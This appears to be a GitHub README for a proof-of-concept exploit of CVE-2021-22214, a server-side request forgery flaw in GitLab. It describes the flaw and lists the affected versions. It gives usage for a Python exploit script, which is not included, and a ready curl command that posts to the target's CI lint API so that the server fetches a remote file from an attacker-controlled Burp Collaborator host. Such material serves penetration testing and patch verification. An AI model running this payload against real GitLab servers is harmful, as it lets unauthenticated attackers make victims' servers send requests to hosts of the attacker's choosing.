# CVE-2021-22214
POC for CVE-2021-22214: Gitlab SSRF

<img src="./ssrf.png" />

## Description
The remote GitLab install contains a Server-side request forgery (SSRF) vulnerability as a result of the internal network for webhooks being enabled. A remote, unauthenticated attacker can exploit a registration-limited GitLab instance causing it to make HTTP requests to an arbitrary domain of the attacker's choosing.

## usage
* ## python code
  ```
  usage:   python3 GitLab_SSRF.py <target> <burp_collaborator_url>
  ```
* ### Curl command
```
curl -s –show-error -H 'Content-Type: application/json' https://TargetIP/api/v4/ci/lint –data '{ "include_merged_yaml": true, "content": "include:\n remote: http://Burp-Collaborator/test.yml"}' 
```




### Affect
* Gitlab >=10.5, <13.10.5
* Gitlab >=13.11, <13.11.5
* Gitlab >=13.12, <13.12.2


### Reference
* [GitLab SSRF (CVE-2021-22214)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22214)
* [tenable.com](https://www.tenable.com/plugins/nessus/152483)
